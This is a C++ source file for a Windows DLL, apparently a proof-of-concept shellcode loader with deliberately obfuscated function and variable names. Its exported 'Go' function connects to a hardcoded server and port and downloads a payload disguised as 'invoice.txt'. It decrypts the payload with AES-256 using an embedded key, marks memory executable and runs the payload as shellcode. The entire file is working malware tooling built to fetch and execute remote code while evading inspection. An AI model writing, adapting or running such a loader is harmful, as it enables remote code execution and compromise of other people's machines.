#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32")
#include <psapi.h>

// Define the shellcode function signature
typedef void (*HUUTjodrPVG)();

bool WXEjtHeXGRaH(const char* OQmbgsGuW, int yprPDCUUPq, const char* Random4, char*& GugJH, size_t& ENUQBQQ) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return false;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        perror("Error creating socket");
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(yprPDCUUPq);
    serverAddress.sin_addr.s_addr = inet_addr(OQmbgsGuW);

    if (serverAddress.sin_addr.s_addr == INADDR_NONE) {
        perror("Invalid address/Address not supported");
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
        perror("Connection failed");
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    // Send the length of the file path first
    size_t Random4Len = strlen(Random4);
    printf("Sending file path length: %zu\n", Random4Len);
    send(clientSocket, reinterpret_cast<char*>(&Random4Len), sizeof(Random4Len), 0);

    // Send the file path to the server
    printf("Sending file path: %s\n", Random4);
    send(clientSocket, Random4, Random4Len, 0);

    int fileSize;
    int bytesRead = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
    if (bytesRead != sizeof(fileSize)) {
        printf("Error receiving file size: %d\n", WSAGetLastError());
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    fileSize = ntohl(fileSize); // Convert from network byte order to host byte order

    printf("Received file size: %d\n", fileSize);
    // Receive and save the binary data in a dynamically allocated buffer
    GugJH = new char[fileSize];
    if (GugJH == nullptr) {
        printf("Error allocating memory for binary data.\n");
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    size_t totalSize = 0;
    while (totalSize < fileSize) {
        bytesRead = recv(clientSocket, GugJH + totalSize, fileSize - totalSize, 0);
        if (bytesRead <= 0) {
            printf("Error receiving binary data: %d\n", WSAGetLastError());
            delete[] GugJH;
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }
        totalSize += bytesRead;
    }

    // Close the socket
    closesocket(clientSocket);

    ENUQBQQ = totalSize;
    printf("Received data size: %zu\n", ENUQBQQ);

    return true;
}

int kaRyEcluPiEW(char* gwtamZsHddxtV, unsigned int gwtamZsHddxtV_len, char* iNjzxZyJyK, size_t iNjzxZyJyKlen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)iNjzxZyJyK, (DWORD)iNjzxZyJyKlen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, gwtamZsHddxtV, &gwtamZsHddxtV_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

char iNjzxZyJyK[] =  { 0x59, 0xfa, 0xe2, 0x44, 0x6c, 0xf1, 0x9e, 0xf6, 0xdf, 0xd8, 0x4e, 0x16, 0xcd, 0xf5, 0x8a, 0xf6 };;

extern "C" void CALLBACK Go(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    const char* OQmbgsGuW = "192.168.1.12";        // Replace with the actual server IP
    int yprPDCUUPq = 8080;                     // Replace with the actual server port
    const char* Random4 = "invoice.txt";   // Replace with the actual file path on the server

    char* GugJH;
    size_t ENUQBQQ;

    if (WXEjtHeXGRaH(OQmbgsGuW, yprPDCUUPq, Random4, GugJH, ENUQBQQ)) {
        printf("Binary data received successfully.\n");

        // Print received data size for debugging
        printf("Received data size: %zu\n", ENUQBQQ);

        kaRyEcluPiEW((char*)GugJH, ENUQBQQ, iNjzxZyJyK, sizeof(iNjzxZyJyK));

        // Allocate executable memory with READ, WRITE permissions
        LPVOID executableMemory = VirtualAlloc(NULL, ENUQBQQ, MEM_COMMIT, PAGE_READWRITE);
        if (executableMemory == NULL) {
            DWORD error = GetLastError();
            printf("Error allocating executable memory: %d\n", error);
            delete[] GugJH;
            return;
        }

        // Copy binary data to the executable memory
        memcpy(executableMemory, GugJH, ENUQBQQ);

        // Change the protection to PAGE_EXECUTE_READ
        DWORD oldProtect;
        if (!VirtualProtect(executableMemory, ENUQBQQ, PAGE_EXECUTE_READ, &oldProtect)) {
            DWORD error = GetLastError();
            printf("Error changing memory protection: %d\n", error);
            VirtualFree(executableMemory, 0, MEM_RELEASE);
            delete[] GugJH;
            return;
        }

        // Create a function pointer to the shellcode
        HUUTjodrPVG pCyhiFoGQ = reinterpret_cast<HUUTjodrPVG>(executableMemory);

        // Call the shellcode function
        printf("Executing shellcode...\n");
        pCyhiFoGQ();

        // No freeing of allocated memory in this POC

        printf("Shellcode executed successfully.\n");

        // Free allocated memory
        delete[] GugJH;
    } else {
        printf("Failed to receive binary data.\n");
        return;
    }
}


